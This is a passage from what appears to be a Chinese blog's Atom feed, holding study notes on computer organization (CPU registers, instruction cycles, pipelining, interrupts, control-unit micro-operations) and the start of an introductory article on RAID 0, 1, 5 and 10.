#x548C;&#x903B;&#x8F91;&#x9884;&#x7B97;</p><p>CPU&#x7684;&#x7ED3;&#x6784;</p><p>CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;</p><table><thead><tr><th>&#x5206;&#x7C7B;</th><th>&#x5BC4;&#x5B58;&#x5668;</th><th>&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>&#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x901A;&#x7528;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x5B58;&#x653E;&#x64CD;&#x4F5C;&#x6570;&#xFF1A;&#x53EF;&#x505A;&#x67D0;&#x79CD;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x6240;&#x9700;&#x7684;&#x4E13;&#x7528;&#x5BC4;&#x5B58;&#x5668;</td></tr><tr><td>&#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x5B58;&#x653E;&#x64CD;&#x4F5C;&#x6570;(&#x6EE1;&#x8DB3;&#x5404;&#x79CD;&#x6570;&#x636E;&#x7C7B;&#x578B;)&#x4E24;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x62FC;&#x63A5;&#x5B58;&#x653E;&#x53CC;&#x500D;&#x5B57;&#x957F;&#x6570;&#x636E;</td></tr><tr><td>&#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x5B58;&#x653E;&#x5730;&#x5740;&#xFF1A;&#x5176;&#x4F4D;&#x6570;&#x5E94;&#x6EE1;&#x8DB3;&#x6700;&#x5927;&#x7684;&#x5730;&#x5740;&#x8303;&#x56F4;&#x7528;&#x4E8E;&#x7279;&#x6B8A;&#x7684;&#x5BFB;&#x5740;&#x65B9;&#x5F0F; &#x6BB5;&#x57FA;&#x503C; &#x6808;&#x6307;&#x9488;</td></tr><tr><td>&#x7528;&#x6237;&#x53EF;&#x89C1;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x6761;&#x4EF6;&#x7801;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x5B58;&#x653E;&#x6761;&#x4EF6;&#x7801;&#xFF1A;&#x53EF;&#x4F5C;&#x7A0B;&#x5E8F;&#x5206;&#x652F;&#x7684;&#x4F9D;&#x636E;&#x5982; &#x6B63;&#x3001;&#x8D1F;&#x3001;&#x96F6;&#x3001;&#x6EA2;&#x51FA;&#x3001;&#x8FDB;&#x4F4D;&#x7B49;</td></tr><tr><td>&#x63A7;&#x5236;&#x548C;&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x63A7;&#x5236;&#x5BC4;&#x5B58;&#x5668;</td><td>PC-&gt;MAR-&gt;M-&gt;MDR-&gt;IR&#xFF0C;&#x63A7;&#x5236;CPU</td></tr><tr><td>&#x63A7;&#x5236;&#x548C;&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668;</td><td>&#x72B6;&#x6001;&#x5BC4;&#x5B58;&#x5668;(&#x5B58;&#x653E;&#x6761;&#x4EF6;&#x7801;),PSW&#x5BC4;&#x5B58;&#x5668;(&#x5B58;&#x653E;&#x5B50;&#x7A0B;&#x5E8F;&#x72B6;&#x6001;&#x5B57;)</td></tr></tbody></table><p>&#x6307;&#x4EE4;&#x5468;&#x671F;</p><p>&#x53D6;&#x51FA;&#x5E76;&#x6267;&#x884C;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x6240;&#x9700;&#x7684;&#x5168;&#x90E8;&#x65F6;&#x95F4;&#x3002;&#x5206;&#x4E3A;&#x53D6;&#x503C;&#x5468;&#x671F;&#x548C;&#x6267;&#x884C;&#x5468;&#x671F;</p><p>&#x6307;&#x4EE4;&#x5468;&#x671F;&#x7684;&#x6570;&#x636E;&#x6D41;</p><p>&#x53D6;&#x503C;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;</p><p>&#x95F4;&#x5740;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;</p><p>&#x6267;&#x884C;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;&#x2013;&#x4E0D;&#x540C;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;&#x4E0D;&#x540C;</p><p>&#x4E2D;&#x65AD;&#x5468;&#x671F;&#x6570;&#x636E;&#x6D41;</p><p>&#x5F71;&#x54CD;&#x6307;&#x4EE4;&#x6D41;&#x6C34;&#x7EBF;&#x6027;&#x80FD;&#x7684;&#x56E0;&#x7D20;</p><table><thead><tr><th>&#x56E0;&#x7D20;</th><th>&#x89E3;&#x91CA;</th><th>&#x89E3;&#x51B3;</th></tr></thead><tbody><tr><td>&#x7ED3;&#x6784;&#x76F8;&#x5173;</td><td>&#x4E0D;&#x540C;&#x6307;&#x4EE4;&#x4E89;&#x7528;&#x540C;&#x4E00;&#x529F;&#x80FD;&#x90E8;&#x4EF6;&#x4EA7;&#x751F;&#x8D44;&#x6E90;&#x51B2;&#x7A81;&#x4F7F;&#x6307;&#x4EE4;&#x6D41;&#x6C34;&#x51FA;&#x73B0;&#x505C;&#x987F;&#xFF0C;&#x5F71;&#x54CD;&#x6D41;&#x6C34;&#x7EBF;&#x6548;&#x7387;</td><td>&#x505C;&#x987F;&#x3001;&#x6307;&#x4EE4;&#x5B58;&#x50A8;&#x5668;&#x548C;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5668;&#x5206;&#x5F00;&#x3001;&#x6307;&#x4EE4;&#x9884;&#x53D6;&#x6280;&#x672F;</td></tr><tr><td>&#x6570;&#x636E;&#x76F8;&#x5173;</td><td>&#x4E0D;&#x540C;&#x6307;&#x4EE4;&#x56E0;&#x91CD;&#x53E0;&#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x80FD;&#x6539;&#x53D8;&#x64CD;&#x4F5C;&#x6570;&#x7684; &#x8BFB;/&#x5199; &#x8BBF;&#x95EE;&#x987A;&#x5E8F;</td><td>&#x540E;&#x63A8;&#x6CD5;&#x3001;&#x91C7;&#x7528;&#x65C1;&#x8DEF;&#x6280;&#x672F;</td></tr><tr><td>&#x63A7;&#x5236;&#x76F8;&#x5173;</td><td>&#x7531;&#x8F6C;&#x79FB;&#x6307;&#x4EE4;&#x5F15;&#x8D77;</td><td>&#x4ECA;&#x65E9;&#x5224;&#x522B;&#x8F6C;&#x79FB;&#x662F;&#x5426;&#x53D1;&#x751F;&#x3001;&#x53CA;&#x65E9;&#x751F;&#x6210;&#x8F6C;&#x79FB;&#x76EE;&#x6807;&#x5730;&#x5740;&#x3001;&#x9884;&#x53D6;&#x8F6C;&#x79FB;&#x6210;&#x529F;&#x6216;&#x4E0D;&#x6210;&#x529F;&#x4E24;&#x4E2A;&#x63A7;&#x5236;&#x6D41;&#x65B9;&#x5411;&#x4E0A;&#x7684;&#x76EE;&#x6807;&#x6307;&#x4EE4;&#x3001;&#x52A0;&#x5FEB;&#x548C;&#x63D0;&#x524D;&#x5F62;&#x6210;&#x6761;&#x4EF6;&#x7801;&#x7B49;</td></tr></tbody></table><p>&#x6D41;&#x6C34;&#x7EBF;&#x6027;&#x80FD;</p><table><thead><tr><th>&#x6307;&#x6807;</th><th>&#x6027;&#x80FD;</th></tr></thead><tbody><tr><td>&#x541E;&#x5410;&#x7387;</td><td>&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185; &#x6D41;&#x6C34;&#x7EBF;&#x6240;&#x5B8C;&#x6210;&#x6307;&#x4EE4; &#x6216;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x7684;&#x6570;&#x91CF;</td></tr><tr><td>&#x52A0;&#x901F;&#x6BD4;</td><td>m &#x6BB5;&#x7684;&#x6D41;&#x6C34;&#x7EBF;&#x7684;&#x901F;&#x5EA6;&#x4E0E;&#x7B49;&#x529F;&#x80FD;&#x7684;&#x975E;&#x6D41;&#x6C34;&#x7EBF;&#x7684;&#x901F;&#x5EA6;&#x4E4B;&#x6BD4;</td></tr><tr><td>&#x6548;&#x7387;</td><td>&#x6D41;&#x6C34;&#x7EBF;&#x4E2D;&#x5404;&#x529F;&#x80FD;&#x6BB5;&#x7684; &#x5229;&#x7528;&#x7387;</td></tr></tbody></table><p>&#x6D41;&#x6C34;&#x7EBF;&#x7684;&#x591A;&#x53D1;&#x6280;&#x672F;</p><p>&#x8D85;&#x6807;&#x91CF;&#x6280;&#x672F;&#x3001;&#x8D85;&#x6D41;&#x6C34;&#x7EBF;&#x6280;&#x672F;&#x3001;&#x8D85;&#x957F;&#x6307;&#x4EE4;&#x5B57;&#x6280;&#x672F;</p><p>&#x6D41;&#x6C34;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x6307;&#x4EE4;&#x6D41;&#x6C34;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x8FD0;&#x7B97;&#x6D41;&#x6C34;&#x7EBF;</p><p>&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;</p><p>&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x6807;&#x8BB0;&#x3001;&#x4E2D;&#x65AD;&#x5224;&#x4F18;&#x903B;&#x8F91;&#x3001;&#xFF08;&#x786C;&#x4EF6;&#x6392;&#x961F;&#x3001;&#x8F6F;&#x4EF6;&#x6392;&#x961F;&#xFF09;</p><p>&#x4E2D;&#x65AD;&#x54CD;&#x5E94;</p><p>&#x54CD;&#x5E94;&#x4E2D;&#x65AD;&#x7684;&#x6761;&#x4EF6;&#xFF1A;&#x5141;&#x8BB8;&#x4E2D;&#x65AD;&#x89E6;&#x53D1;&#x5668; EINT = 1</p><p>&#x54CD;&#x5E94;&#x4E2D;&#x65AD;&#x7684; &#x65F6;&#x95F4;&#xFF1A;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x5468;&#x671F;&#x7ED3;&#x675F;&#x65F6;&#x523B;&#x7531;CPU&#x53D1;&#x67E5;&#x8BE2;&#x4FE1;&#x53F7;</p><p>&#x4E2D;&#x65AD;&#x9690;&#x6307;&#x4EE4;</p><p>1.&#x4FDD;&#x62A4;&#x7A0B;&#x5E8F;&#x65AD;&#x70B9;</p><p>2.&#x5BFB;&#x627E;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x5165;&#x53E3;&#x5730;&#x5740;</p><p>3.&#x786C;&#x4EF6; &#x5173;&#x4E2D;&#x65AD;</p><p>&#x4FDD;&#x62A4;&#x73B0;&#x573A;&#x548C;&#x6062;&#x590D;&#x73B0;&#x573A;</p><p>&#x7A0B;&#x5E8F;&#x65AD;&#x70B9;&#x4FDD;&#x62A4;&#x548C;&#x4FDD;&#x62A4;CPU&#x5185;&#x90E8;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x5185;&#x5BB9;</p><p>&#x4E2D;&#x65AD;&#x5C4F;&#x853D;&#x6280;&#x672F;</p><p>1.&#x591A;&#x91CD;&#x4E2D;&#x65AD;&#x7684;&#x6982;&#x5FF5;</p><p>2.&#x5B9E;&#x73B0;&#x591A;&#x91CD;&#x4E2D;&#x65AD;&#x7684;&#x6761;&#x4EF6;</p><p>1).&#x63D0;&#x524D;&#x8BBE;&#x7F6E;&#x201C;&#x5F00;&#x4E2D;&#x65AD;&#x201D;&#x6307;&#x4EE4;</p><p>2).&#x4F18;&#x5148;&#x7EA7;&#x522B;&#x9AD8;&#x7684;&#x4E2D;&#x65AD;&#x6E90;&#x6709;&#x6743;&#x4E2D;&#x65AD;&#x4F18;&#x5148;&#x7EA7;&#x522B;&#x4F4E;&#x7684;&#x4E2D;&#x65AD;&#x6E90;</p><p>3.&#x5C4F;&#x853D;&#x6280;&#x672F;</p><p>1).&#x5C4F;&#x853D;&#x89E6;&#x53D1;&#x5668;&#x548C;&#x5C4F;&#x853D;&#x5B57;</p><p>2).&#x5C4F;&#x853D;&#x6280;&#x672F;&#x53EF;&#x6539;&#x53D8;&#x4F18;&#x5148;&#x7B49;&#x7EA7;</p><p>3).&#x5C4F;&#x853D;&#x6280;&#x672F;&#x7684;&#x5176;&#x4ED6;&#x5E94;&#x7528;</p><p>4.&#x591A;&#x91CD;&#x4E2D;&#x65AD;&#x7684;&#x65AD;&#x70B9;&#x4FDD;&#x62A4;</p><p>&#x4E5D;  &#x63A7;&#x5236;&#x5355;&#x5143;&#x529F;&#x80FD;</p><p>&#x53D6;&#x503C;&#x5468;&#x671F;</p><p>PC-&gt;MAR</p><p>1-&gt;R</p><p>M(MAR)-&gt;MDR</p><p>MDR-&gt;IR</p><p>OP(IR)-&gt;CU</p><p>(PC)+1-&gt;PC</p><p>&#x95F4;&#x5740;&#x5468;&#x671F;</p><p>Ad(IR)-&gt;MAR</p><p>1-&gt;R</p><p>M(MAR)-&gt;MDR</p><p>MDR-&gt;Ad(IR)</p><p>&#x6267;&#x884C;&#x5468;&#x671F;</p><table><thead><tr><th>&#x6307;&#x4EE4;&#x7C7B;&#x522B;</th><th>&#x6B65;&#x9AA4;</th></tr></thead><tbody><tr><td>&#x975E;&#x8BBF;&#x5B58;&#x6307;&#x4EE4;</td><td>0-&gt;ACC&#x3001;ACC&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;ACC&#xAF;-&gt;ACC&#x3001;L(ACC)-&gt;R(ACC),ACC0ACC0-&gt;ACC0ACC0&#x3001;R(ACC)-&gt;L(ACC),ACC0ACC0-&gt;ACC0ACC0&#x3001;0-&gt;G</td></tr><tr><td>&#x8BBF;&#x5B58;&#x6307;&#x4EE4;-&#x52A0;&#x6CD5;&#x6307;&#x4EE4;</td><td>ADD X&#x3001;Ad(IR)-&gt;MAR&#x3001;1-&gt;R&#x3001;M(MAR)-&gt;MDR&#x3001;(ACC)+(MDR)-&gt;ACC</td></tr><tr><td>&#x8BBF;&#x5B58;&#x6307;&#x4EE4;-&#x5B58;&#x6570;&#x6307;&#x4EE4;</td><td>STA X&#x3001;Ad(IR)-&gt;MAR&#x3001;1-&gt;W&#x3001;ACC-&gt;MDR&#x3001;MDR-&gt;M(MAR)</td></tr><tr><td>&#x8BBF;&#x5B58;&#x6307;&#x4EE4;-&#x53D6;&#x6570;&#x6307;&#x4EE4;</td><td>LDA x&#x3001;Ad(IR)-&gt;MAR&#x3001;1-&gt;R&#x3001;M(MAR)-&gt;MDR&#x3001;MDR-ACC</td></tr><tr><td>&#x8F6C;&#x79FB;&#x6307;&#x4EE4;-&#x65E0;&#x6761;&#x4EF6;&#x8F6C;&#x79FB;</td><td>JMP x&#x3001;Ad(IR)-&gt;PC</td></tr><tr><td>&#x8F6C;&#x79FB;&#x6307;&#x4EE4;-&#x6761;&#x4EF6;&#x8F6C;&#x79FB;</td><td>BAN X(&#x8D1F;&#x5219;&#x8F6C;)&#x3001;A0&#x2217;Ad(IR)+A0&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;(PC)&#x2212;&gt;PCA0&#x2217;Ad(IR)+A0&#xAF;(PC)&#x2212;&gt;PC</td></tr></tbody></table><p>&#x4E2D;&#x65AD;&#x5468;&#x671F;</p><p>0-&gt;MAR</p><p>1-&gt;W</p><p>PC-&gt;MDR</p><p>MDR-&gt;M(MAR)</p><p>&#x4E2D;&#x65AD;&#x7A0B;&#x5E8F;&#x8BC6;&#x522B;&#x7A0B;&#x5E8F;&#x5165;&#x53E3;&#x5730;&#x5740;M-&gt;PC</p><p>0-&gt;EINT</p><p>&#x63A7;&#x5236;&#x65B9;&#x5F0F;</p><table><thead><tr><th>&#x63A7;&#x5236;&#x65B9;&#x5F0F;</th><th>&#x89E3;&#x91CA;</th></tr></thead><tbody><tr><td>&#x540C;&#x6B65;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>&#x4EFB;&#x4E00;&#x5FAE;&#x64CD;&#x4F5C;&#x5747;&#x7531;&#x7EDF;&#x4E00;&#x57FA;&#x51C6;&#x65F6;&#x6807;&#x7684;&#x65F6;&#x5E8F;&#x4FE1;&#x53F7;&#x63A7;&#x5236;</td></tr><tr><td>&#x5F02;&#x6B65;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>&#x65E0;&#x57FA;&#x51C6;&#x65F6;&#x6807;&#x4FE1;&#x53F7;&#x3001;&#x65E0;&#x56FA;&#x5B9A;&#x7684;&#x5468;&#x671F;&#x8282;&#x62CD;&#x548C;&#x4E25;&#x683C;&#x7684;&#x65F6;&#x949F;&#x540C;&#x6B65;&#x3001;&#x91C7;&#x7528; &#x5E94;&#x7B54;&#x65B9;&#x5F0F;</td></tr><tr><td>&#x8054;&#x5408;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>&#x540C;&#x6B65;&#x4E0E;&#x5F02;&#x6B65;&#x76F8;&#x7ED3;&#x5408;</td></tr><tr><td>&#x4EBA;&#x5DE5;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>Reset&#x3001;&#x8FDE;&#x7EED;&#x548C;&#x5355;&#x6761;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x8F6C;&#x6362;&#x5F00;&#x5173;&#x3001;&#x7B26;&#x5408;&#x505C;&#x673A;&#x5F00;&#x5173;</td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;2.14，去**的情人节，还是电脑好玩&lt;/p&gt;
&lt;p&gt;我吐了，组成原理真是大学最痛苦的课程之一，太难了o(╥﹏╥)o&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;计算机组成&lt;/p&gt;
&lt;p&gt;一  计算机系统概论&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RAID磁盘阵列技术介绍</title>
    <link href="https://marnm.github.io//posts/fa8e89f7/"/>
    <id>https://marnm.github.io//posts/fa8e89f7/</id>
    <published>2018-08-31T08:33:36.000Z</published>
    <updated>2020-04-09T11:50:11.084Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h3><p>RAID&#xFF08;&#x72EC;&#x7ACB;&#x5197;&#x4F59;&#x78C1;&#x76D8;&#x9635;&#x5217;&#xFF09;&#x6280;&#x672F;&#x662F;&#x901A;&#x8FC7;&#x628A;&#x591A;&#x4E2A;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x7EC4;&#x5408;&#x6210;&#x4E00;&#x4E2A;&#x5BB9;&#x91CF;&#x5927;&#x3001;&#x5B89;&#x5168;&#x6027;&#x66F4;&#x597D;&#x7684;&#x78C1;&#x76D8;&#x9635;&#x5217;&#xFF0C;&#x5E76;&#x628A;&#x6570;&#x5207;&#x5272;&#x6210;&#x591A;&#x4E2A;&#x5206;&#x533A;&#x6BB5;&#x540E;&#x5206;&#x522B;&#x5B58;&#x653E;&#x5728;&#x5404;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x4E0A;&#xFF0C;&#x7136;&#x540E;&#x5229;&#x7528;&#x5206;&#x6563;&#x8BFB;&#x5199;&#x6280;&#x672F;&#x6765;&#x63D0;&#x5347;&#x78C1;&#x76D8;&#x9635;&#x5217;&#x6574;&#x4F53;&#x7684;&#x6027;&#x80FD;&#xFF0C;&#x540C;&#x4E8B;&#x5427;&#x591A;&#x4E2A;&#x91CD;&#x8981;&#x6570;&#x636E;&#x7684;&#x526F;&#x672C;&#x540C;&#x6B65;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x8BBE;&#x5907;&#x4E0A;&#x3002;<br><a id="more"></a><br>RAID&#x6280;&#x672F;&#x5177;&#x6709;&#x975E;&#x5E38;&#x597D;&#x7684;&#x6570;&#x636E;&#x5197;&#x4F59;&#x5907;&#x4EFD;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x5B83;&#x4E5F;&#x76F8;&#x5E94;&#x5730;&#x63D0;&#x9AD8;&#x4E86;&#x6210;&#x672C;&#x652F;&#x51FA;&#x3002;</p><p>&#x76EE;&#x524D;&#x5DF2;&#x6709;&#x7684;RAID&#x78C1;&#x76D8;&#x9635;&#x5217;&#x65B9;&#x6848;&#x81F3;&#x5C11;&#x6709;&#x5341;&#x51E0;&#x79CD;&#xFF0C;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x6709;RAID0&#x3001;RAID1&#x3001;RAI5&#x548C;RAID10&#x8FD9;&#x51E0;&#x79CD;&#x3002;</p><h3 id="RAID-0"><a href="#RAID-0" class="headerlink" title="RAID 0"></a>RAID 0</h3><p>RAID0&#x662F;&#x628A;&#x591A;&#x5757;&#x7269;&#x7406;&#x786C;&#x76D8;&#xFF08;&#x81F3;&#x5C11;&#x4E24;&#x5757;&#xFF09;&#x901A;&#x8FC7;&#x786C;&#x4EF6;&#x6216;&#x8F6F;&#x4EF6;&#x7684;&#x65B9;&#x5F0F;&#x4E32;&#x8054;&#x5728;&#x4E00;&#x8D77;&#xFF0C;&#x7EC4;&#x6210;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x5377;&#x7EC4;&#xFF0C;&#x5E76;&#x5C06;&#x6570;&#x636E;&#x4F9D;&#x6B21;&#x5199;&#x5165;&#x5230;&#x5404;&#x4E2A;&#x7269;&#x7406;&#x786C;&#x76D8;&#x4E2D;&#x3002;RAID0&#x80FD;&#x591F;&#x6709;&#x6548;&#x7684;&#x63D0;&#x5347;&#x786C;&#x76D8;&#x6570;&#x636E;&#x7684;&#x541E;&#x5410;&#x901F;&#x5EA6;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x5177;&#x5907;&#x6570;&#x636E;&#x4FEE;&#x590D;&#x548C;&#x9519;&#x8BEF;&#x4FEE;&#x590D;&#x7684;&#x80FD;&#x529B;&#x3002;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/RAID_0.svg/150px-RAID_0.svg.png" alt="RAID0 &#x6280;&#x672F;&#x793A;&#x610F;&#x56FE;" title="">                </div>                <div class="image-caption">RAID0 &#x6280;&#x672F;&#x793A;&#x610F;&#x56FE;</div>            </figure><h3 id="RAID-1"><a href="#RAID-1" class="headerlink" title="RAID 1"></a>RAID 1</h3><p>RAID1&#x5B83;&#x662F;&#x628A;&#x4E24;&#x5757;&#x4EE5;&#x4E0A;&#x7684;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x8FDB;&#x884C;&#x7ED1;&#x5B9A;&#xFF0C;&#x5728;&#x5199;&#x5165;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x540C;&#x65F6;&#x5199;&#x5165;&#x5230;&#x591A;&#x5757;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x4E0A;&#xFF08;&#x53EF;&#x4EE5;&#x5C06;&#x5176;&#x89C6;&#x4E3A;&#x6570;&#x636E;&#x7684;&#x955C;&#x50CF;&#x6216;&#x5907;&#x4EFD;&#xFF09;&#x3002;&#x4F46;&#x5176;&#x4E2D;&#x4E00;&#x5757;&#x786C;&#x76D8;&#x53D1;&#x751F;&#x6545;&#x969C;&#x540E;&#xFF0C;&#x4E00;&#x822C;&#x4F1A;&#x7ACB;&#x5373;&#x81EA;&#x52A8;&#x4EE5;&#x70ED;&#x5907;&#x4EFD;&#x4EA4;&#x6362;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x6062;&#x590D;&#x6570;&#x636E;&#x7684;&#x6B63;&#x5E38;&#x4F7F;&#x7528;&#x3002;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Raid1.png/184px-Raid1.png" alt="RAID1" title="">                </div>                <div class="image-caption">RAID1</div>            </figure><p>RAID1&#x6CE8;&#x91CD;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;&#x6027;&#xFF0C;&#x5229;&#x7528;&#x7387;&#x4F4E;&#xFF0C;&#x800C;&#x4E14;&#xFF0C;&#x7531;&#x4E8E;&#x9700;&#x8981;&#x628A;&#x6570;&#x636E;&#x540C;&#x65F6;&#x5199;&#x5165;&#x5230;&#x4E24;&#x5757;&#x4EE5;&#x4E0A;&#x7684;&#x786C;&#x76D8;&#x52A0;&#x4E0A;&#xFF0C;&#x8FD9;&#x65E0;&#x7591;&#x4E5F;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x589E;&#x52A0;&#x4E86;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x8D1F;&#x8F7D;</p><h3 id="RAID-5"><a href="#RAID-5" class="headerlink" title="RAID 5"></a>RAID 5</h3><p>RAID 5&#x6280;&#x672F;&#x5728;&#x7406;&#x8BBA;&#x4E0A;&#x517C;&#x987E;&#x4E86;&#x4E09;&#x8005;&#xFF08;&#x8BFB;&#x5199;&#x901F;&#x5EA6;&#x3001;&#x6570;&#x636E;&#x5B89;&#x5168;&#x6027;&#x3001;&#x6210;&#x672C;&#xFF09;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x4E0A;&#x66F4;&#x50CF;&#x662F;&#x5BF9;&#x8FD9;&#x4E09;&#x8005;&#x7684;&#x201C;&#x76F8;&#x4E92;&#x59A5;&#x534F;&#x201D;&#x3002;</p><p>RAID5&#x662F;&#x628A;&#x786C;&#x76D8;&#x7684;&#x6570;&#x636E;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#x4FDD;&#x5B58;&#x5230;&#x5176;&#x4ED6;&#x786C;&#x76D8;&#x4E2D;&#x3002;RAID5&#x78C1;&#x76D8;&#x9635;&#x5217;&#x7EC4;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4FE1;&#x606F;&#x5E76;&#x4E0D;&#x662F;&#x5355;&#x72EC;&#x4FDD;&#x5B58;&#x5230;&#x67D0;&#x4E00;&#x5757;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x4E2D;&#xFF0C;&#x800C;&#x662F;&#x5B58;&#x50A8;&#x5230;&#x9664;&#x81EA;&#x8EAB;&#x4EE5;&#x5916;&#x7684;&#x5176;&#x4ED6;&#x6BCF;&#x4E00;&#x5757;&#x786C;&#x76D8;&#x4E0A;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x597D;&#x5904;&#x662F;&#x5176;&#x4E2D;&#x4EFB;&#x4F55;&#x4E00;&#x5757;&#x8BBE;&#x5907;&#x635F;&#x574F;&#x540E;&#x4E0D;&#x81F3;&#x4E8E;&#x51FA;&#x73B0;&#x81F4;&#x547D;&#x7F3A;&#x9677;<br></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/RAID_5.svg/640px-RAID_5.svg.png" alt="RAID 5" title="">                </div>                <div class="image-caption">RAID 5</div>            </figure><p></p><p>&#x56FE;&#x4E2D;<code>Ap</code> ~ <code>Dp</code>&#x90E8;&#x5206;&#x5B58;&#x653E;&#x7684;&#x5C31;&#x662F;&#x6570;&#x636E;&#x7684;&#x5947;&#x5076;&#x6821;&#x9A8C;&#x4FE1;&#x606F;</p><h3 id="RAID-10"><a href="#RAID-10" class="headerlink" title="RAID 10"></a>RAID 10</h3><p>&#x9274;&#x4E8E;RAID5&#x6280;&#x672F;&#x662F;&#x56E0;&#x4E3A;&#x786C;&#x76D8;&#x8BBE;&#x5907;&#x7684;&#x6210;&#x672C;&#x95EE;&#x9898;&#x8BFB;&#x8BFB;&#x5199;&#x901F;&#x5EA6;&#x548C;&#x6570;&#x636E;&#x5B89;&#x5168;&#x6027;&#x80FD;&#x6709;&#x4E86;&#x4E00;&#x5B9A;&#x7684;&#x59A5;&#x534F;&#xFF0C;&#x4F46;&#x662F;&#x5927;&#x90E8;&#x5206;&#x4F01;&#x4E1A;&#x66F4;&#x5728;&#x4E4E;&#x7684;&#x662F;&#x6570;&#x636E;&#x672C;&#x8EAB;&#x7684;&#x4EF7;&#x503C;&#x800C;&#x975E;&#x786C;&#x76D8;&#x4EF7;&#x683C;&#xFF0C;&#x56E0;&#x6B64;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x5E38;&#x7528;RAID10&#x6280;&#x672F;&#x3002;</p><p>RAID 10&#x662F;RAID 1+RAID 0&#x6280;&#x672F;&#x7684;&#x4E00;&#x4E2A;&#x7EC4;&#x5408;&#x4F53;&#x3002;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bb/RAID_10.svg/220px-RAID_10.svg.png" alt="RAID 10" title="">                </div>                <div class="image-caption">RAID 10</div>            </figure><p>&#x7EC4;&#x5EFA;RAID 